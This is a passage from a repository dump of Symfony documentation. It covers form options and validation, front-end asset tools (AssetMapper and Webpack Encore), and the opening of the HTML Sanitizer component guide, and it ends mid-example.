xsi:schemaLocation=\"http://symfony.com/schema/dic/constraint-mapping\n                https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd\">\n\n            <class name=\"App\\Entity\\Task\">\n                <property name=\"task\">\n                    <constraint name=\"NotBlank\"/>\n                </property>\n                <property name=\"dueDate\">\n                    <constraint name=\"NotBlank\"/>\n                    <constraint name=\"Type\">\\DateTimeInterface</constraint>\n                </property>\n            </class>\n        </constraint-mapping>\n\n    .. code-block:: php\n\n        // src/Entity/Task.php\n        namespace App\\Entity;\n\n        use Symfony\\Component\\Validator\\Constraints\\NotBlank;\n        use Symfony\\Component\\Validator\\Constraints\\Type;\n        use Symfony\\Component\\Validator\\Mapping\\ClassMetadata;\n\n        class Task\n        {\n            // ...\n\n            public static function loadValidatorMetadata(ClassMetadata $metadata): void\n            {\n                $metadata->addPropertyConstraint('task', new NotBlank());\n\n                $metadata->addPropertyConstraint('dueDate', new NotBlank());\n                $metadata->addPropertyConstraint(\n                    'dueDate',\n                    new Type(\\DateTimeInterface::class)\n                );\n            }\n        }\n\nThat's it! If you re-submit the form with invalid data, you'll see the\ncorresponding errors printed out with the form.\n\nTo see the second approach - adding constraints to the form - refer to\n:ref:`this section <form-option-constraints>`. Both approaches can be used together.\n\nOther Common Form Features\n--------------------------\n\nPassing Options to Forms\n~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you :ref:`create forms in classes <creating-forms-in-classes>`, when building\nthe form in the controller you can pass custom options to it as the third optional\nargument of ``createForm()``::\n\n    // src/Controller/TaskController.php\n    namespace App\\Controller;\n\n    use App\\Form\\Type\\TaskType;\n    // ...\n\n    class TaskController extends AbstractController\n    {\n        public function new(): Response\n        {\n            $task = new Task();\n            // use some PHP logic to decide if this form field is required or not\n            $dueDateIsRequired = ...;\n\n            $form = $this->createForm(TaskType::class, $task, [\n                'require_due_date' => $dueDateIsRequired,\n            ]);\n\n            // ...\n        }\n    }\n\nIf you try to use the form now, you'll see an error message: *The option\n\"require_due_date\" does not exist.* That's because forms must declare all the\noptions they accept using the ``configureOptions()`` method::\n\n    // src/Form/Type/TaskType.php\n    namespace App\\Form\\Type;\n\n    use Symfony\\Component\\OptionsResolver\\OptionsResolver;\n    // ...\n\n    class TaskType extends AbstractType\n    {\n        // ...\n\n        public function configureOptions(OptionsResolver $resolver): void\n        {\n            $resolver->setDefaults([\n                // ...,\n                'require_due_date' => false,\n            ]);\n\n            // you can also define the allowed types, allowed values and\n            // any other feature supported by the OptionsResolver component\n            $resolver->setAllowedTypes('require_due_date', 'bool');\n        }\n    }\n\nNow you can use this new form option inside the ``buildForm()`` method::\n\n    // src/Form/Type/TaskType.php\n    namespace App\\Form\\Type;\n\n    use Symfony\\Component\\Form\\AbstractType;\n    use Symfony\\Component\\Form\\Extension\\Core\\Type\\DateType;\n    use Symfony\\Component\\Form\\FormBuilderInterface;\n\n    class TaskType extends AbstractType\n    {\n        public function buildForm(FormBuilderInterface $builder, array $options): void\n        {\n            $builder\n                // ...\n                ->add('dueDate', DateType::class, [\n                    'required' => $options['require_due_date'],\n                ])\n            ;\n        }\n\n        // ...\n    }\n\nForm Type Options\n~~~~~~~~~~~~~~~~~\n\nEach :ref:`form type <form-types>` has a number of options to configure it, as\nexplained in the :doc:`Symfony form types reference </reference/forms/types>`.\nTwo commonly used options are ``required`` and ``label``.\n\nThe ``required`` Option\n.......................\n\nThe most common option is the ``required`` option, which can be applied to any\nfield. By default, this option is set to ``true``, meaning that HTML5-ready\nbrowsers will require you to fill in all fields before submitting the form.\n\nIf you don't want this behavior, either\n:ref:`disable client-side validation <forms-html5-validation-disable>` for the\nentire form or set the ``required`` option to ``false`` on one or more fields::\n\n    ->add('dueDate', DateType::class, [\n        'required' => false,\n    ])\n\nThe ``required`` option does not perform any server-side validation. If a user\nsubmits a blank value for the field (either with an old browser or a web\nservice, for example), it will be accepted as a valid value unless you also use\nSymfony's ``NotBlank`` or ``NotNull`` validation constraints.\n\nThe ``label`` Option\n....................\n\nBy default, the label of form fields are the *humanized* version of the\nproperty name (``user`` -> ``User``; ``postalAddress`` -> ``Postal Address``).\nSet the ``label`` option on fields to define their labels explicitly::\n\n    ->add('dueDate', DateType::class, [\n        // set it to FALSE to not display the label for this field\n        'label' => 'To Be Completed Before',\n    ])\n\n.. tip::\n\n    By default, ``<label>`` tags of required fields are rendered with a\n    ``required`` CSS class, so you can display an asterisk by applying a CSS style:\n\n    .. code-block:: css\n\n        label.required:before {\n            content: \"*\";\n        }\n\n.. _forms-change-action-method:\n\nChanging the Action and HTTP Method\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nBy default, the ``<form>`` tag is rendered with a ``method=\"post\"`` attribute,\nand no ``action`` attribute. This means that the form is submitted via an HTTP\nPOST request to the same URL under which it was rendered. When building the form,\nuse the ``setAction()`` and ``setMethod()`` methods to change this::\n\n    // src/Controller/TaskController.php\n    namespace App\\Controller;\n\n    // ...\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\Form\\Extension\\Core\\Type\\DateType;\n    use Symfony\\Component\\Form\\Extension\\Core\\Type\\SubmitType;\n    use Symfony\\Component\\Form\\Extension\\Core\\Type\\TextType;\n\n    class TaskController extends AbstractController\n    {\n        public function new(): Response\n        {\n            // ...\n\n            $form = $this->createFormBuilder($task)\n                ->setAction($this->generateUrl('target_route'))\n                ->setMethod('GET')\n                // ...\n                ->getForm();\n\n            // ...\n        }\n    }\n\nWhen building the form in a class, pass the action and method as form options::\n\n    // src/Controller/TaskController.php\n    namespace App\\Controller;\n\n    use App\\Form\\TaskType;\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    // ...\n\n    class TaskController extends AbstractController\n    {\n        public function new(): Response\n        {\n            // ...\n\n            $form = $this->createForm(TaskType::class, $task, [\n                'action' => $this->generateUrl('target_route'),\n                'method' => 'GET',\n            ]);\n\n            // ...\n        }\n    }\n\nFinally, you can override the action and method in the template by passing them\nto the ``form()`` or the ``form_start()`` helper functions:\n\n.. code-block:: twig\n\n    {# templates/task/new.html.twig #}\n    {{ form_start(form, {'action': path('target_route'), 'method': 'GET'}) }}\n\n.. note::\n\n    If the form's method is not ``GET`` or ``POST``, but ``PUT``, ``PATCH`` or\n    ``DELETE``, Symfony will insert a hidden field with the name ``_method``\n    that stores this method. The form will be submitted in a normal ``POST``\n    request, but :doc:`Symfony's routing </routing>` is capable of detecting the\n    ``_method`` parameter and will interpret it as a ``PUT``, ``PATCH`` or\n    ``DELETE`` request. The :ref:`http_method_override <configuration-framework-http_method_override>`\n    option must be enabled for this to work.\n\nChanging the Form Name\n~~~~~~~~~~~~~~~~~~~~~~\n\nIf you inspect the HTML contents of the rendered form, you'll see that the\n``<form>`` name and the field names are generated from the type class name\n(e.g. ``<form name=\"task\" ...>`` and ``<select name=\"task[dueDate][date][month]\" ...>``).\n\nIf you want to modify this, use the :method:`Symfony\\\\Component\\\\Form\\\\FormFactoryInterface::createNamed`\nmethod::\n\n    // src/Controller/TaskController.php\n    namespace App\\Controller;\n\n    use App\\Form\\TaskType;\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\Form\\FormFactoryInterface;\n    // ...\n\n    class TaskController extends AbstractController\n    {\n        public function new(FormFactoryInterface $formFactory): Response\n        {\n            $task = ...;\n            $form = $formFactory->createNamed('my_name', TaskType::class, $task);\n\n            // ...\n        }\n    }\n\nYou can even suppress the name completely by setting it to an empty string.\n\n.. _forms-html5-validation-disable:\n\nClient-Side HTML Validation\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThanks to HTML5, many browsers can natively enforce certain validation\nconstraints on the client side. The most common validation is activated by\nadding a ``required`` attribute on fields that are required. For browsers\nthat support HTML5, this will result in a native browser message being displayed\nif the user tries to submit the form with that field blank.\n\nGenerated forms take full advantage of this new feature by adding sensible HTML\nattributes that trigger the validation. The client-side validation, however, can\nbe disabled by adding the ``novalidate`` attribute to the ``<form>`` tag or\n``formnovalidate`` to the submit tag. This is especially useful when you want to\ntest your server-side validation constraints, but are being prevented by your\nbrowser from, for example, submitting blank fields.\n\n.. code-block:: twig\n\n    {# templates/task/new.html.twig #}\n    {{ form_start(form, {'attr': {'novalidate': 'novalidate'}}) }}\n        {{ form_widget(form) }}\n    {{ form_end(form) }}\n\n.. _form-type-guessing:\n\nForm Type Guessing\n~~~~~~~~~~~~~~~~~~\n\nIf the object handled by the form includes validation constraints, Symfony can\nintrospect that metadata to guess the type of your field.\nIn the above example, Symfony can guess from the validation rules that the\n``task`` field is a normal ``TextType`` field and the ``dueDate`` field is a\n``DateType`` field.\n\nTo enable Symfony's \"guessing mechanism\", omit the second argument to the ``add()`` method, or\npass ``null`` to it::\n\n    // src/Form/Type/TaskType.php\n    namespace App\\Form\\Type;\n\n    use Symfony\\Component\\Form\\AbstractType;\n    use Symfony\\Component\\Form\\Extension\\Core\\Type\\DateType;\n    use Symfony\\Component\\Form\\Extension\\Core\\Type\\SubmitType;\n    use Symfony\\Component\\Form\\Extension\\Core\\Type\\TextType;\n    use Symfony\\Component\\Form\\FormBuilderInterface;\n\n    class TaskType extends AbstractType\n    {\n        public function buildForm(FormBuilderInterface $builder, array $options): void\n        {\n            $builder\n                // if you don't define field options, you can omit the second argument\n                ->add('task')\n                // if you define field options, pass NULL as second argument\n                ->add('dueDate', null, ['required' => false])\n                ->add('save', SubmitType::class)\n            ;\n        }\n    }\n\n.. warning::\n\n    When using a specific :doc:`form validation group </form/validation_groups>`,\n    the field type guesser will still consider *all* validation constraints when\n    guessing your field types (including constraints that are not part of the\n    validation group(s) being used).\n\nForm Type Options Guessing\n..........................\n\nWhen the guessing mechanism is enabled for some field, in addition to its form type,\nthe following options will be guessed too:\n\n``required``\n    The ``required`` option is guessed based on the validation rules (i.e. is\n    the field ``NotBlank`` or ``NotNull``) or the Doctrine metadata (i.e. is the\n    field ``nullable``). This is very useful, as your client-side validation will\n    automatically match your validation rules.\n\n``maxlength``\n    If the field is some sort of text field, then the ``maxlength`` option attribute\n    is guessed from the validation constraints (if ``Length`` or ``Range`` is used)\n    or from the :doc:`Doctrine </doctrine>` metadata (via the field's length).\n\nIf you'd like to change one of the guessed values, override it in the options field array::\n\n    ->add('task', null, ['attr' => ['maxlength' => 4]])\n\n.. seealso::\n\n    Besides guessing the form type, Symfony also guesses :ref:`validation constraints <validating-forms>`\n    if you're using a Doctrine entity. Read :ref:`automatic_object_validation`\n    guide for more information.\n\nUnmapped Fields\n~~~~~~~~~~~~~~~\n\nWhen editing an object via a form, all form fields are considered properties of\nthe object. Any fields on the form that do not exist on the object will cause an\nexception to be thrown.\n\nIf you need extra fields in the form that won't be stored in the object (for\nexample to add an *\"I agree with these terms\"* checkbox), set the ``mapped``\noption to ``false`` in those fields::\n\n    // ...\n    use Symfony\\Component\\Form\\Extension\\Core\\Type\\CheckboxType;\n    use Symfony\\Component\\Form\\Extension\\Core\\Type\\SubmitType;\n    use Symfony\\Component\\Form\\FormBuilderInterface;\n\n    class TaskType extends AbstractType\n    {\n        public function buildForm(FormBuilderInterface $builder, array $options): void\n        {\n            $builder\n                ->add('task')\n                ->add('dueDate')\n                ->add('agreeTerms', CheckboxType::class, ['mapped' => false])\n                ->add('save', SubmitType::class)\n            ;\n        }\n    }\n\nThese \"unmapped fields\" can be set and accessed in a controller with::\n\n    $form->get('agreeTerms')->getData();\n    $form->get('agreeTerms')->setData(true);\n\nAdditionally, if there are any fields on the form that aren't included in\nthe submitted data, those fields will be explicitly set to ``null``.\n\nLearn more\n----------\n\nWhen building forms, keep in mind that the first goal of a form is to translate\ndata from an object (``Task``) to an HTML form so that the user can modify that\ndata. The second goal of a form is to take the data submitted by the user and to\nre-apply it to the object.\n\nThere's a lot more to learn and a lot of *powerful* tricks in the Symfony forms:\n\nReference:\n\n.. toctree::\n    :maxdepth: 1\n\n    /reference/forms/types\n\nAdvanced Features:\n\n.. toctree::\n    :maxdepth: 1\n\n    /controller/upload_file\n    /security/csrf\n    /form/create_custom_field_type\n    /form/data_transformers\n    /form/data_mappers\n    /form/create_form_type_extension\n    /form/type_guesser\n\nForm Themes and Customization:\n\n.. toctree::\n    :maxdepth: 1\n\n    /form/bootstrap4\n    /form/bootstrap5\n    /form/tailwindcss\n    /form/form_customization\n    /form/form_themes\n\nEvents:\n\n.. toctree::\n    :maxdepth: 1\n\n    /form/events\n    /form/dynamic_form_modification\n\nValidation:\n\n.. toctree::\n    :maxdepth: 1\n\n    /form/validation_groups\n    /form/validation_group_service_resolver\n    /form/button_based_validation\n    /form/disabling_validation\n\nMisc.:\n\n.. toctree::\n    :maxdepth: 1\n\n    /form/direct_submit\n    /form/embedded\n    /form/form_collections\n    /form/inherit_data_option\n    /form/multiple_buttons\n    /form/unit_testing\n    /form/use_empty_data\n    /form/without_class\n\n.. _`Symfony Forms screencast series`: https://symfonycasts.com/screencast/symfony-forms\n.. _`MakerBundle`: https://symfony.com/doc/current/bundles/SymfonyMakerBundle/index.html\n.. _`HTTP 422 Unprocessable Content`: https://www.rfc-editor.org/rfc/rfc9110.html#name-422-unprocessable-content\n.. _`Symfony UX Turbo`: https://ux.symfony.com/turbo\n"
        },
        {
          "name": "frontend.rst",
          "type": "blob",
          "size": 6.2509765625,
          "content": "Front-end Tools: Handling CSS & JavaScript\n==========================================\n\nSymfony gives you the flexibility to choose any front-end tools you want. There\nare generally two approaches:\n\n#. :ref:`building your HTML with PHP & Twig <frontend-twig-php>`;\n#. :ref:`building your frontend with a JavaScript framework <frontend-js>` like React, Vue, Svelte, etc.\n\nBoth work great - and are discussed below.\n\n.. _frontend-twig-php:\n\nUsing PHP & Twig\n----------------\n\nSymfony comes with two powerful options to help you build a modern and fast frontend:\n\n* :ref:`AssetMapper <frontend-asset-mapper>` (recommended for new projects) runs\n  entirely in PHP, doesn't require any build step and leverages modern web standards.\n\n* :ref:`Webpack Encore <frontend-webpack-encore>` is built with `Node.js`_\n  on top of `Webpack`_.\n\n================================  ==================================  ==========\n                                  AssetMapper                         Encore\n================================  ==================================  ==========\nProduction Ready?                 yes                                 yes\nStable?                           yes                                 yes\nRequirements                      none                                Node.js\nRequires a build step?            no                                  yes\nWorks in all browsers?            yes                                 yes\nSupports `Stimulus/UX`_           yes                                 yes\nSupports Sass/Tailwind            :ref:`yes <asset-mapper-tailwind>`  yes\nSupports React, Vue, Svelte?      yes :ref:`[1] <ux-note-1>`          yes\nSupports TypeScript               :ref:`yes <asset-mapper-ts>`        yes\nRemoves comments from JavaScript  no :ref:`[2] <ux-note-2>`           yes\nRemoves comments from CSS         no :ref:`[2] <ux-note-2>`           no\nVersioned assets                  always                              optional\nCan update 3rd party packages     yes                                 no :ref:`[3] <ux-note-3>`\n================================  ==================================  ==========\n\n.. _ux-note-1:\n\n**[1]** Using JSX (React), Vue, etc with AssetMapper is possible, but you'll\nneed to use their native tools for pre-compilation. Also, some features (like\nVue single-file components) cannot be compiled down to pure JavaScript that can\nbe executed by a browser.\n\n.. _ux-note-2:\n\n**[2]** You can install the `SensioLabs Minify Bundle`_ to minify CSS/JS code\n(and remove all comments) when compiling assets with AssetMapper.\n\n.. _ux-note-3:\n\n**[3]** If you use ``npm``, there are update checkers available (e.g. ``npm-check``).\n\n.. _frontend-asset-mapper:\n\nAssetMapper (Recommended)\n~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. screencast::\n\n    Do you prefer video tutorials? Check out the `AssetMapper screencast series`_.\n\nAssetMapper is the recommended system for handling your assets. It runs entirely\nin PHP with no complex build step or dependencies. It does this by leveraging\nthe ``importmap`` feature of your browser, which is available in all browsers thanks\nto a polyfill.\n\n:doc:`Read the AssetMapper Documentation </frontend/asset_mapper>`\n\n.. _frontend-webpack-encore:\n\nWebpack Encore\n~~~~~~~~~~~~~~\n\n.. screencast::\n\n    Do you prefer video tutorials? Check out the `Webpack Encore screencast series`_.\n\n`Webpack Encore`_ is a simpler way to integrate `Webpack`_ into your application.\nIt wraps Webpack, giving you a clean & powerful API for bundling JavaScript modules,\npre-processing CSS & JS and compiling and minifying assets.\n\n:doc:`Read the Encore Documentation </frontend/encore/index>`\n\nSwitch from AssetMapper\n^^^^^^^^^^^^^^^^^^^^^^^\n\nBy default, new Symfony webapp projects (created with ``symfony new --webapp myapp``)\nuse AssetMapper. If you still need to use Webpack Encore, use the following steps to\nswitch. This is best done on a new project and provides the same features (Turbo/Stimulus)\nas the default webapp.\n\n.. code-block:: terminal\n\n    # Remove AssetMapper & Turbo/Stimulus temporarily\n    $ composer remove symfony/ux-turbo symfony/asset-mapper symfony/stimulus-bundle\n\n    # Add Webpack Encore & Turbo/Stimulus back\n    $ composer require symfony/webpack-encore-bundle symfony/ux-turbo symfony/stimulus-bundle\n\n    # Install & Build Assets\n    $ npm install\n    $ npm run dev\n\nStimulus & Symfony UX Components\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nOnce you've installed AssetMapper or Webpack Encore, it's time to start building your\nfront-end. You can write your JavaScript however you want, but we recommend\nusing `Stimulus`_, `Turbo`_ and a set of tools called `Symfony UX`_.\n\nTo learn about Stimulus & the UX Components, see\nthe `StimulusBundle Documentation`_\n\n.. _frontend-js:\n\nUsing a Front-end Framework (React, Vue, Svelte, etc)\n-----------------------------------------------------\n\n.. screencast::\n\n    Do you prefer video tutorials? Check out the `API Platform screencast series`_.\n\nIf you want to use a front-end framework (Next.js, React, Vue, Svelte, etc),\nwe recommend using their native tools and using Symfony as a pure API. A wonderful\ntool to do that is `API Platform`_. Their standard distribution comes with a\nSymfony-powered API backend, frontend scaffolding in Next.js (other frameworks\nare also supported) and a React admin interface. It comes fully Dockerized and even\ncontains a web server.\n\nOther Front-End Articles\n------------------------\n\n* :doc:`/frontend/create_ux_bundle`\n* :doc:`/frontend/custom_version_strategy`\n* :doc:`/frontend/server-data`\n\n.. _`Webpack Encore`: https://www.npmjs.com/package/@symfony/webpack-encore\n.. _`Webpack`: https://webpack.js.org/\n.. _`Node.js`: https://nodejs.org/\n.. _`Webpack Encore screencast series`: https://symfonycasts.com/screencast/webpack-encore\n.. _`StimulusBundle Documentation`: https://symfony.com/bundles/StimulusBundle/current/index.html\n.. _`Stimulus/UX`: https://symfony.com/bundles/StimulusBundle/current/index.html\n.. _`Stimulus`: https://stimulus.hotwired.dev/\n.. _`Turbo`: https://turbo.hotwired.dev/\n.. _`Symfony UX`: https://ux.symfony.com\n.. _`API Platform`: https://api-platform.com/\n.. _`SensioLabs Minify Bundle`: https://github.com/sensiolabs/minify-bundle\n.. _`AssetMapper screencast series`: https://symfonycasts.com/screencast/asset-mapper\n.. _`API Platform screencast series`: https://symfonycasts.com/screencast/api-platform\n"
        },
        {
          "name": "frontend",
          "type": "tree",
          "content": null
        },
        {
          "name": "getting_started",
          "type": "tree",
          "content": null
        },
        {
          "name": "html_sanitizer.rst",
          "type": "blob",
          "size": 43.1708984375,
          "content": "HTML Sanitizer\n==============\n\nThe HTML Sanitizer component aims at sanitizing/cleaning untrusted HTML\ncode (e.g. created by a WYSIWYG editor in the browser) into HTML that can\nbe trusted. It is based on the `HTML Sanitizer W3C Standard Proposal`_.\n\nThe HTML sanitizer creates a new HTML structure from scratch, taking only\nthe elements and attributes that are allowed by configuration. This means\nthat the returned HTML is very predictable (it only contains allowed\nelements), but it does not work well with badly formatted input (e.g.\ninvalid HTML). The sanitizer is targeted for two use cases:\n\n* Preventing security attacks based on :ref:`XSS <xss-attacks>` or other technologies\n  relying on the execution of malicious code on the visitors browsers;\n* Generating HTML that always respects a certain format (only certain\n  tags, attributes, hosts, etc.) to be able to consistently style the\n  resulting output with CSS. This also protects your application against\n  attacks related to e.g. changing the CSS of the whole page.\n\n.. _html-sanitizer-installation:\n\nInstallation\n------------\n\nYou can install the HTML Sanitizer component with:\n\n.. code-block:: terminal\n\n    $ composer require symfony/html-sanitizer\n\nBasic Usage\n-----------\n\nUse the :class:`Symfony\\\\Component\\\\HtmlSanitizer\\\\HtmlSanitizer` class to\nsanitize the HTML. In the Symfony framework, this class is available as the\n``html_sanitizer`` service. This service will be :doc:`autowired </service_container/autowiring>`\nautomatically when type-hinting for\n:class:`Symfony\\\\Component\\\\HtmlSanitizer\\\\HtmlSanitizerInterface`:\n\n.. configuration-block::\n\n    .. code-block:: php-symfony\n\n        // src/Controller/BlogPostController.php\n        namespace App\\Controller;\n\n        // ...\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizerInterface;\n\n        class BlogPostController extends AbstractController\n        {\n            public function createAction(HtmlSanitizerInterface $htmlSanitizer, Request $request): Response\n            {\n                $unsafeContents = $request->getPayload()->get('post_contents');\n\n                $safeContents = $htmlSanitizer->sanitize($unsafeContents);\n                // ... proceed using the safe HTML\n            }\n        }\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizer;\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizerConfig;\n\n        $htmlSanitizer = new HtmlSanitizer(\n            (new HtmlSanitizerConfig())->allowSafeElements()\n        );\n\n        // unsafe HTML (e.g. from a WYSIWYG editor in the browser)\n        $unsafePostContents = ...;\n\n        $safePostContents = $htmlSanitizer->sanitize($unsafePostContents);\n        // ... proceed using the safe HTML\n\n.. note::\n\n    The default configuration of the HTML sanitizer allows all \"safe\"\n    elements and attributes, as defined by the `W3C Standard Proposal`_. In\n    practice, this means that the resulting code will not contain any\n    scripts, styles or other elements that can cause the website to behave\n    or look different. Later in this article, you'll learn how to\n    :ref:`fully customize the HTML sanitizer <html-sanitizer-configuration>`.\n\nSanitizing HTML for a Specific Context\n--------------------------------------\n\nThe default :method:`Symfony\\\\Component\\\\HtmlSanitizer\\\\HtmlSanitizer::sanitize`\nmethod cleans the HTML code for usage in the ``<body>`` element. Using the\n:method:`Symfony\\\\Component\\\\HtmlSanitizer\\\\HtmlSanitizer::sanitizeFor`\nmethod, you can instruct HTML sanitizer to customize this for the\n``<head>`` or a more specific HTML tag::\n\n    // tags not allowed in <head> will be removed\n    $safeInput = $htmlSanitizer->sanitizeFor('head', $userInput);\n\n    // encodes the returned HTML using HTML entities\n    $safeInput = $htmlSanitizer->sanitizeFor('title', $userInput);\n    $safeInput = $htmlSanitizer->sanitizeFor('textarea', $userInput);\n\n    // uses the <body> context, removing tags only allowed in <head>\n    $safeInput = $htmlSanitizer->sanitizeFor('body', $userInput);\n    $safeInput = $htmlSanitizer->sanitizeFor('section', $userInput);\n\nSanitizing HTML from Form Input\n-------------------------------\n\nThe HTML sanitizer component directly integrates with Symfony Forms, to\nsanitize the form input before it is processed by your application.\n\nYou can enable the sanitizer in ``TextType`` forms, or any form extending\nthis type (such as ``TextareaType``), using the ``sanitize_html`` option::\n\n    // src/Form/BlogPostType.php\n    namespace App\\Form;\n\n    // ...\n    class BlogPostType extends AbstractType\n    {\n        // ...\n\n        public function configureOptions(OptionsResolver $resolver): void\n        {\n            $resolver->setDefaults([\n                'sanitize_html' => true,\n                // use the \"sanitizer\" option to use a custom sanitizer (see below)\n                //'sanitizer' => 'app.post_sanitizer',\n            ]);\n        }\n    }\n\n.. _html-sanitizer-twig:\n\nSanitizing HTML in Twig Templates\n---------------------------------\n\nBesides sanitizing user input, you can also sanitize HTML code before\noutputting it in a Twig template using the ``sanitize_html()`` filter:\n\n.. code-block:: twig\n\n    {{ post.body|sanitize_html }}\n\n    {# you can also use a custom sanitizer (see below) #}\n    {{ post.body|sanitize_html('app.post_sanitizer') }}\n\n.. _html-sanitizer-configuration:\n\nConfiguration\n-------------\n\nThe behavior of the HTML sanitizer can be fully customized. This allows you\nto explicitly state which elements, attributes and even attribute values\nare allowed.\n\nYou can do this by defining a new HTML sanitizer in the configuration:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/html_sanitizer.yaml\n        framework:\n            html_sanitizer:\n                sanitizers:\n                    app.post_sanitizer:\n                        block_elements:\n                            - h1\n\n    .. code-block:: xml\n\n        <!-- config/packages/html_sanitizer.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:html-sanitizer>\n                    <framework:sanitizer name=\"app.post_sanitizer\">\n                        <framework:block-element name=\"h1\"/>\n                    </framework:sanitizer>\n                </framework:html-sanitizer>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->htmlSanitizer()\n                ->sanitizer('app.post_sanitizer')\n                    ->blockElement('h1')\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizer;\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizerConfig;\n\n        $postSanitizer = new HtmlSanitizer(\n            (new HtmlSanitizerConfig())\n                ->blockElement('h1')\n        );\n\nThis configuration defines a new ``html_sanitizer.sanitizer.app.post_sanitizer``\nservice. This service will be :doc:`autowired </service_container/autowiring>`\nfor services having an ``HtmlSanitizerInterface $appPostSanitizer`` parameter.\n\nAllow Element Baselines\n~~~~~~~~~~~~~~~~~~~~~~~\n\nYou can start the custom HTML sanitizer by using one of the two baselines:\n\nStatic elements\n    All elements and attributes on the baseline allow lists from the\n    `W3C Standard Proposal`_ (this does not include scripts).\nSafe elements\n    All elements and attributes from the \"static elements\" list, excluding\n    elements and attributes that can also lead to CSS\n    injection/click-jacking.\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/html_sanitizer.yaml\n        framework:\n            html_sanitizer:\n                sanitizers:\n                    app.post_sanitizer:\n                        # enable either of these\n                        allow_safe_elements: true\n                        allow_static_elements: true\n\n    .. code-block:: xml\n\n        <!-- config/packages/html_sanitizer.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:html-sanitizer>\n                    <!-- allow-safe-elements/allow-static-elements:\n                         enable either of these -->\n                    <framework:sanitizer\n                        name=\"app.post_sanitizer\"\n                        allow-safe-elements=\"true\"\n                        allow-static-elements=\"true\"\n                    />\n                </framework:html-sanitizer>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->htmlSanitizer()\n                ->sanitizer('app.post_sanitizer')\n                    // enable either of these\n                    ->allowSafeElements(true)\n                    ->allowStaticElements(true)\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizer;\n        use Symfony\\Component\\HtmlSanitizer\\HtmlSanitizerConfig;\n\n        $postSanitizer = new HtmlSanitizer(\n            (new HtmlSanitizerConfig())\n                // enable either of these\n                ->allowSafeElements()\n                ->allowStaticElements()\n        );\n\nAllow Elements\n~~~~~~~~~~~~~~\n\nThis adds elements to the allow list. For each element, you can also\nspecify the allowed attributes on that element. If not given, all allowed\nattributes from the `W3C Standard Proposal`_ are allowed.\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/html_sanitizer.yaml\n        framework:\n            html_sanitizer:\n                sanitizers:\n                    app.post_sanitizer:\n                        # ...\n                        allow_elements:\n                            # allow the <article> element and 2 attributes\n                            article: ['class', 'data-attr']\n                            # allow the <img> element and preserve the src attribute\n                            img: 'src'\n                            # allow the <h1> element with all safe attributes\n                            h1: '*'\n\n    .. code-block:: xml\n\n        <!-- config/packages/html_sanitizer.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:html-sanitizer>\n                    <!-- allow-safe-elements/allow-static-elements:\n                         enable either of these -->\n                    <framework:sanitizer name=\"app.post_sanitizer\">\n                        <!-- allow the <article> element and 2 attributes -->\n                        <framework:allow-element name=\"article\">\n                            <framework:attribute>class</framework:attribute>\n                            <framework:attribute>data-attr</framework:attribute>\n                        </framework:allow-element>\n\n                        <!-- allow the <img> element and preserve the src attribute -->\n                        <framework:allow-element name=\"img\">\n                            <framework:attribute>src</framework:attribute>\n                        </framework:allow-element>\n\n                        <!-- allow the <h1> element with all safe attributes -->\n                        <framework:allow-element name=\"img\">\n                            <framework:attribute>*</framework:attribute>\n                        </framework:allow-element>\n                    </framework:sanitizer>\n                </framework:html-sanitizer>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n    